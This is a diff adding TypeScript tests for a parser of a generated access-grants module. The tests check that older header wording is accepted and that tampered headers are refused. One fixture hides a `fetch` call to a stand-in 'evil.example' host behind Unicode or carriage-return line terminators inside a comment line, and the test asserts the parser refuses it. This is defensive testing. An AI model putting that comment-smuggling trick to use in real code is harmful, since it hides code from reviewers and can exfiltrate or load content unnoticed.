@@ -282,6 +282,54 @@ throwsWith(
     "module: an edited header is REFUSED",
   );
 
+  const bannerLine = mod.slice(0, mod.indexOf("\n"));
+  const olderHeader = mod.replace(/\n\/\/ To change it by hand[^\n]*\n/, "\n// To change it by hand, edit only the data below and keep the layout exactly as emitted.\n");
+  ok(olderHeader !== mod, "module: (fixture) the older-header edit actually changed the bytes");
+  ok(parseGrantsModule(olderHeader) !== undefined, "module: a header with OLDER WORDS is accepted (OPE-2217: a header change is not a breaking upgrade)");
+  const shorterHeader = `${bannerLine}\n${mod.slice(mod.indexOf("\n\nimport type") + 1)}`;
+  ok(parseGrantsModule(shorterHeader) !== undefined, "module: a header of the banner line alone is accepted");
+  ok(renormalizeGrantsModule(olderHeader) === mod, "module: renormalize REFRESHES an older header to the current words");
+  throwsWith(
+    () => parseGrantsModule(olderHeader.replace('  "bundles"', '    "bundles"')),
+    "not in canonical form",
+    "module: an older header does NOT excuse a hand-edited body",
+  );
+  for (const [name, terminator] of [["U+2028", "\u2028"], ["U+2029", "\u2029"], ["CR", "\r"]] as const) {
+    throwsWith(
+      () => parseGrantsModule(mod.replace("// The grants overlay:", `// note${terminator}globalThis.x = fetch("https://evil.example");\n// The grants overlay:`)),
+      "does not start with the generated header",
+      `module: a header line that hides code behind a ${name} line terminator is REFUSED`,
+    );
+  }
+  for (const directive of ["// @ts-nocheck", "//@ts-ignore", "/// <reference path=\"./elsewhere.d.ts\" />"]) {
+    throwsWith(
+      () => parseGrantsModule(mod.replace(`${bannerLine}\n`, `${bannerLine}\n${directive}\n`)),
+      "does not start with the generated header",
+      `module: a header line holding the TypeScript directive \`${directive}\` is REFUSED`,
+    );
+  }
+  throwsWith(
+    () => parseGrantsModule(mod.replace(`${bannerLine}\n`, `${bannerLine}\nglobalThis.x = 1;\n`)),
+    "does not start with the generated header",
+    "module: a statement INSIDE the header block is REFUSED",
+  );
+  throwsWith(
+    () => parseGrantsModule(`/* ${bannerLine.slice(3)} */\n${mod.slice(mod.indexOf("\n") + 1)}`),
+    "does not start with the generated header",
+    "module: a block-comment banner is REFUSED (the header is `//` lines only)",
+  );
+  throwsWith(
+    () => parseGrantsModule(`//\n${mod}`),
+    "does not start with the generated header",
+    "module: a header whose FIRST line is not the banner is REFUSED",
+  );
+  throwsWith(() => parseGrantsModule(mod.replace(/^\/\/ GENERATED[^\n]*\n/, "")), "does not start with the generated header", "module: a deleted banner line is REFUSED");
+  ok(
+    !mod.includes("npm run overlays:normalize") && mod.includes("npx oe overlays normalize"),
+    "module: the header names the `oe` command an npm app has, not a repository-only npm script (OPE-2216)",
+  );
+  ok(mod.includes("(@open-everywhere/core/agent/access/grants-codemod.js)") && !mod.includes("packages/core/"), "module: the header names the codemod by package specifier, not by repository path");
+
   const reordered = mod.replace('"alpha"', '"\u0000"').replace('"zeta"', '"alpha"').replace('"\u0000"', '"zeta"');
   ok(reordered !== mod, "module: (fixture) the reordering edit actually changed the bytes");
   throwsWith(() => parseGrantsModule(reordered), "not in canonical form", "module: a hand-reordered array is REFUSED (round-trip check), not silently rewritten");
